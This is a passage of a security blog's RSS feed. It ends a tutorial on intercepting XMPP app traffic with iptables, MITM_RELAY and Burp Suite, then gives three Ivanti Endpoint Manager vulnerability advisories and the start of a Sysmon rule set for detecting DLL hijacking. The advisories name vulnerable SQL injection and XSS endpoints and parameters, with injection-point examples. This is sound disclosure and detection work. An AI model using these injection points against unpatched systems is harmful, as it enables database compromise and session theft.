&lt;li&gt;I am using a XMPP based chat mobile application. You, however, can choose any kind of application you would like to test. &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Firewall Setup&lt;span class=&#34;absolute -mt-20&#34; id=&#34;firewall-setup&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#firewall-setup&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We will need to manipulate the firewall for our task. Fortunately for us, my colleague SHD already talks about how to use &lt;a href=&#34;https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;iptables&lt;/strong&gt;&lt;/a&gt; to create super specific firewall changes.&lt;/p&gt;
&lt;p&gt;Lets leverage a visual to show what we’ll need our firewall to do: &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/firewall.png&#34; alt=&#34;firewall&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Our firewall will need to do some very specific port forwarding…there are two ways to utilise &lt;strong&gt;iptables&lt;/strong&gt; to achieve this task.&lt;/p&gt;
&lt;p&gt;You can either forward one specific port on TCP/UDP for all destinations to the relay: &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -t nat -A OUTPUT -p tcp --dport &lt;span class=&#34;m&#34;&gt;5222&lt;/span&gt; -j DNAT --to-destination 192.168.1.184:9876&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Or you can forward one specific port on TCP/UDP for one specific destination to the relay:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -t nat -A OUTPUT -p tcp -s DEST_IP--dport &lt;span class=&#34;m&#34;&gt;5222&lt;/span&gt; -j DNAT --to-destination 192.168.1.184:9876&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;For the application you are researching, you have the task of identifying which ports to use and forward to - I unfortunately do not have the answers for your application. But I do have the answers for the Alpaca App, so let’s keep going. &lt;/p&gt;
&lt;h2&gt;Ready to start testing? &lt;span class=&#34;absolute -mt-20&#34; id=&#34;ready-to-start-testing&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#ready-to-start-testing&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now that our environment is set up, let&amp;rsquo;s fire up our mobile application (Alpaca App) and see where the packets go.&lt;/p&gt;
&lt;h3&gt;Client to Server&lt;span class=&#34;absolute -mt-20&#34; id=&#34;client-to-server&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#client-to-server&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In the top half of the screenshot (below), we can see MITM_RELAY confirm its listening configuration and then confirm it has received the new client (new connection)  that it will forward on. &lt;/p&gt;
&lt;p&gt;The lower half of the screenshot is our Burp Suite proxy tool that is receiving relay’s forwarded information.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/client_to_server.png&#34; alt=&#34;client to server&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;Server to Client&lt;span class=&#34;absolute -mt-20&#34; id=&#34;server-to-client&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#server-to-client&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;And on return from the Alpaca Inc. servers, Burp Suite intercepts the communication destined for the Alpaca mobile app.  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;X-Mitm_Relay-to&lt;/strong&gt; and &lt;strong&gt;X-Mitm_Relay-From&lt;/strong&gt; indicates the changes between &lt;strong&gt;thick&lt;/strong&gt; &lt;strong&gt;client&lt;/strong&gt; and &lt;strong&gt;application&lt;/strong&gt; &lt;strong&gt;server&lt;/strong&gt; addresses dynamically, based on the where the packets come from.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/server_to_client.png&#34; alt=&#34;server to client&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;Alpaca App chat&lt;span class=&#34;absolute -mt-20&#34; id=&#34;alpaca-app-chat&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#alpaca-app-chat&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Let’s use the cool chat in the Alpaca App to send our best buddy a message.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/buddy.png&#34; alt=&#34;buddy&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This message goes from Alpaca App &amp;mdash;&amp;raquo; MITM_RELAY &amp;mdash;&amp;raquo; Burp Suite proxy. If we recall, this converts the original XMPP into HTTP, which Burp Suite can understand.&lt;/p&gt;
&lt;p&gt;We can see the intercepted contents in Burp Suite:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/intercepte.png&#34; alt=&#34;intercepte&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now we have intercepted the message in the Alpaca App chat, we can drop or forward the message further. Let’s make sure it gets through.&lt;/p&gt;
&lt;p&gt;Here we can see the actual conversation between the two mobile devices. Both are using the Alpaca App and communicating through XMPP. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/comms.png&#34; alt=&#34;comms&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;There and back again&lt;/h1&gt;&lt;p&gt;The moral of this story is that we do not have to give up on our security tooling if it has default limitations. On the contrary, we can layer up the tools we use and extend the capability of the tools that we are comfortable with. &lt;/p&gt;
&lt;p&gt;In our example, we extended Burp Suite’s HTTP-default capabilities with MITM_RELAY so we could assess the Alpaca App that uses the XMPP protocol. &lt;/p&gt;
&lt;p&gt;I hope you found this useful, and remember it next time you need to research TEXT-based traffic in Non-HTTP protocols. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Intercept everything and enjoy my friends!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/alpaca_cool.png&#34; alt=&#34;alpaca cool&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Muhammet Ali Arıtürk&lt;/strong&gt; is a Security Researcher @ JUMPSEC. &lt;/p&gt;
&lt;p&gt;You can &lt;a href=&#34;https://twitter.com/hit1t&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;follow him on Twitter&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;.&lt;/strong&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13769 – Ivanti Unified Endpoint Manager SQL injection</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-advisory-cve-2020-13769-ivanti-uem-sql-injection/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-13-advisory-cve-2020-13769-ivanti-uem-sql-injection/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1; &amp;lt;= 2019.1.3&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13769&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 13/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 7.4 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;A number of web components in Endpoint Manager do not properly sanitize user input when executing SQL queries, leaving the application vulnerable to injection attacks towards the underlying database.&lt;br&gt;
On a standard installation with default options, the account used to query the database is database administrator.&lt;/p&gt;
&lt;p&gt;Solution&lt;/p&gt;
&lt;p&gt;The issue has been successfully resolved by the vendor in version 2020.1.1. Customers can install the latest available software update to fix the vulnerability. The vendor also reported this has also been fixed in version 2019.1.4, although this has not been verified by JUMPSEC.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The following endpoints and parameters are vulnerable and exploitable by any authenticated user:&lt;/p&gt;
&lt;p&gt;POST /LDMS/alert_log.aspx?d=alert_log&amp;amp;tb=serverAlertLog.tb&lt;br&gt;
&amp;ldquo;filterValue&amp;rdquo; parameter&lt;br&gt;
Type: Stacked, time-based blind, boolean-based blind&lt;br&gt;
Example: filterValue=&amp;rsquo;;injection_query_here&amp;ndash;&lt;/p&gt;
&lt;p&gt;POST /remotecontrolauth/api/device&lt;br&gt;
&amp;ldquo;global&amp;rdquo;, &amp;ldquo;displayname&amp;rdquo;, &amp;ldquo;ipaddress&amp;rdquo;, &amp;ldquo;owner&amp;rdquo; parameters&lt;br&gt;
Type: Time-based blind, boolean-based blind&lt;br&gt;
Example: &amp;ldquo;global&amp;rdquo;:&amp;quot;&amp;rsquo;+(injection_query_here)+&amp;rsquo;&amp;quot;&lt;br&gt;
This instance also requires a valid &amp;ldquo;sessionid&amp;rdquo; in the request.&lt;/p&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
13/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13772 - Ivanti Unified Endpoint Manager system information disclosure</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-cve-2020-13772-ivanti-uem-system-information-disclosure/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-13-cve-2020-13772-ivanti-uem-system-information-disclosure/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1.1&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13772&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 13/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 5.3 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, unauthenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Ivanti Unified Endpoint Manager&amp;rsquo;s &amp;ldquo;ldcient&amp;rdquo; component expose information about the system that could be used in further attacks against the system.&lt;/p&gt;
&lt;p&gt;Mitigation&lt;/p&gt;
&lt;p&gt;There is currently no fix for this issue. The vendor has yet to release a patch to address the vulnerability; it is advised to review the host configuration and monitor for suspicious activity. If possible, consider disabling or whitelisting access to the affected URLs.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The following endpoint expose information about the system, such as environment variables, domain name, internal paths and CPU information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/ldclient/ldprov.cgi, HTTP 9595&lt;/li&gt;
&lt;li&gt;/ldclient/ldprov.cgi, HTTPS 9594&lt;/li&gt;
&lt;li&gt;/ldclient/ldprov.cgi, HTTPS 9593&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
13/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13773 - Ivanti Unified Endpoint Manager Reflected XSS</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-cve-2020-13773-ivanti-uem-reflected-xss/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-13-cve-2020-13773-ivanti-uem-reflected-xss/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1.1&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13773&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 13/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 5.5 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Various web pages on Ivanti Unified Endpoint Manager web management console lack proper input validation on parameters passed in HTTP request, leaving the application vulnerable to client-side attacks. An attacker able to cause the victim to open a malicious URL would obtain javascript code execution on the victim&amp;rsquo;s browser and potentially be able to obtain sensitive information and execute actions on their behalf.&lt;/p&gt;
&lt;p&gt;Mitigation&lt;/p&gt;
&lt;p&gt;There is currently no fix for this issue. The vendor has yet to release a patch to address the vulnerability; it is advised to review the host configuration and monitor for suspicious activity.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The following endpoints and parameter are vulnerable:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/LDMS/frm_splitfrm.aspx &amp;ldquo;top&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_splitfrm.aspx &amp;ldquo;ttb&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_splitfrm.aspx &amp;ldquo;splittf&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/licensecheck.aspx &amp;ldquo;doc&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_splitcollapse.aspx &amp;ldquo;bottom&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/alert_log.aspx &amp;ldquo;sortdir&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/alert_log.aspx &amp;ldquo;sortcol&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/ServerList.aspx &amp;ldquo;sortdir&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_coremainfrm.aspx &amp;ldquo;bfn&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_findfrm.aspx &amp;ldquo;m&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_taskfrm.aspx any parameter&lt;/li&gt;
&lt;li&gt;/LDMS/query_browsecomp.aspx &amp;ldquo;t&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/sm_actionfrm.asp &amp;ldquo;bfn&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/sm_actionfrm.asp &amp;ldquo;d&amp;rdquo; parameter&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
13/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Detecting known DLL hijacking and named pipe token impersonation attacks with Sysmon</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-13-detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/</guid>
      <description>
        
        
        &lt;p&gt;Background&lt;/p&gt;
&lt;p&gt;Recently we posted a bunch of &lt;a href=&#34;https://labs.jumpsec.com/tag/ivanti/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;advisories&lt;/a&gt; relating to Ivanti Unified Endpoint Manager, a couple of which are for vulnerabilities which can be used to achieve local privilege escalation.&lt;/p&gt;
&lt;p&gt;At JUMPSEC, whenever we find a new vulnerability, we like to challenge ourselves to write rules to detect it being exploited. We learn a lot doing this, it’s kind of fun tweaking the exploit to try and evade detection and really challenges us to write good detection rulesets.&lt;/p&gt;
&lt;p&gt;Naturally, with the right signatures you can detect future exploitation of an issue, but it’s also fun/scary (delete as appropriate!) to run this on historical data and find out if someone else got there first and the vulnerability has been exploited in the wild already…&lt;/p&gt;
&lt;p&gt;We enjoy doing it, we know it is valuable to our clients and we’d love to see more of it being done which is why we’re making an effort to share some detail relating to our recent Ivanti advisories.&lt;/p&gt;
&lt;p&gt;Introduction&lt;/p&gt;
&lt;p&gt;Because of the high number of components that make up an operating system, attackers with local access have a very wide array of possible ways to interact with the system in malicious ways, even when limited to low privileges. This corresponds to a greater effort required to properly monitor for suspicious behaviour and detect attacks.&lt;/p&gt;
&lt;p&gt;In light of the recent vulnerabilities affecting Ivanti Unified Endpoint Manager we want to briefly touch on how it is possible to detect local privilege escalation attack, specifically addressing &lt;a href=&#34;https://labs.jumpsec.com/advisory-cve-2020-13770-ivanti-uem-named-pipe-token-impersonation/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2020-13770&lt;/a&gt; and &lt;a href=&#34;https://labs.jumpsec.com/advisory-cve-2020-13771-ivanti-uem-dll-hijacking/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2020-13771&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;You have probably heard of Sysmon already, but in case you have not, it is a handy tool available in the Windows Sysinternals toolsuite which can track, record and store detailed system events. These events can then be viewed within Windows Event Viewer, and are usually collected by SIEM software for aggregation and analysis.&lt;/p&gt;
&lt;p&gt;We’re focused on Sysmon in this writeup.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;In this section we give a brief explanation of the vulnerabilities and an example of Sysmon configuration rules to log exploitation attempts, along with the rationale behind them so you can adapt them to your existing configuration if needed. These will act as a solid first point of detection, and while the events thereby generated will be by themselves a confident indicator for malicious activity, they can be further correlated with other events for even more precise monitoring.&lt;/p&gt;
&lt;p&gt;CVE-2020-13771 - DLL search order hijacking&lt;/p&gt;
&lt;p&gt;To exploit this vulnerability a local attacker needs to create a malicious DLL library and place it in a particular path on the filesystem. This path is entirely dependent on the host configuration; the vulnerable software relies on Windows&amp;rsquo; &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#search-order-for-desktop-applications&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DLL Search Order for desktop applications&lt;/a&gt;, reported below, for locating and loading a DLL file.&lt;/p&gt;
&lt;p&gt;With SafeDllSearchMode enabled:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The directory from which the application loaded.&lt;/li&gt;
&lt;li&gt;The system directory. This is usually C:\Windows\System32\ and/or C:\Windows\SysWow64\ depending on the OS and process architecture.&lt;/li&gt;
&lt;li&gt;The 16-bit system directory. This is usually C:\Windows\System\&lt;/li&gt;
&lt;li&gt;The Windows directory. This is usually C:\Windows&lt;/li&gt;
&lt;li&gt;The process&amp;rsquo; current directory.&lt;/li&gt;
&lt;li&gt;The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;With SafeDllSearchMode disabled:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The directory from which the application loaded.&lt;/li&gt;
&lt;li&gt;The process&amp;rsquo; current directory.&lt;/li&gt;
&lt;li&gt;The system directory. This is usually C:\Windows\System32\ and/or C:\Windows\SysWow64\ depending on the OS and process architecture.&lt;/li&gt;
&lt;li&gt;The 16-bit system directory. This is usually C:\Windows\System\&lt;/li&gt;
&lt;li&gt;The Windows directory. This is usually C:\Windows&lt;/li&gt;
&lt;li&gt;The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SafeDllSearchMode is essentially a setting, enabled by default, which places the process&amp;rsquo; current directory later in the search order to try mitigate this type of vulnerabilities. Its value can be set to 1 (enabled) or 0 (disabled) in the following registry key:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In both circumstances the OS will look for a DLL file in the directories listed in the PATH environment variable, in the order as they appear, in case the library has not been not found yet. This variable needs particular attention, as it is easy to end up with directories writable by Everyone; moreover many software installers will silently append their directories to it.&lt;/p&gt;
&lt;p&gt;If a local attacker - or a remote one with an arbitrary filesystem write primitive - is able to place the malicious library in one of these paths, taking precedence over the path where the legitimate library is found - or regardless of precedence, if the legitimate library is not found at all - the file will be loaded by the vulnerable process, which will execute its DllMain function in its own context.&lt;/p&gt;
&lt;p&gt;Going back to the Ivanti Unified Endpoint Manager instance, the DLL files referenced in the advisory are not found by the processes, leaving the attacker a handful of possible paths to place his implant.&lt;/p&gt;
&lt;p&gt;To log exploitation attempts we can instruct Sysmon to record ImageLoad events; as the DLL file needs to have the precise filename the process is looking for, or else it will not be loaded, the filename is a good attribute to set filters on. Since legitimate libraries usually are signed by the software vendor or publisher, we can filter on this criteria to only log unsigned or untrusted images. The following rules will record library loading events on any process for all unsigned/untrusted libraries with these specific filenames, found anywhere in the filesystem:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;Sysmon schemaversion=&amp;#34;4.22&amp;#34;&amp;gt;
    &amp;lt;EventFiltering&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;CVE-2020-13771&amp;#34; groupRelation=&amp;#34;and&amp;#34;&amp;gt;
            &amp;lt;ImageLoad onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;!-- Only log unsigned / invalid signature images --&amp;gt;
                &amp;lt;SignatureStatus condition=&amp;#34;is not&amp;#34;&amp;gt;Valid&amp;lt;/SignatureStatus&amp;gt;
                &amp;lt;!-- Only log these images --&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;ldprofileui.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;wfapi.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;DMIAPI32.DLL&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;logonsrv.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;ldprofileui.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;OOBCredentials.dll&amp;lt;/ImageLoaded&amp;gt;
            &amp;lt;/ImageLoad&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
    &amp;lt;/EventFiltering&amp;gt;
&amp;lt;/Sysmon&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
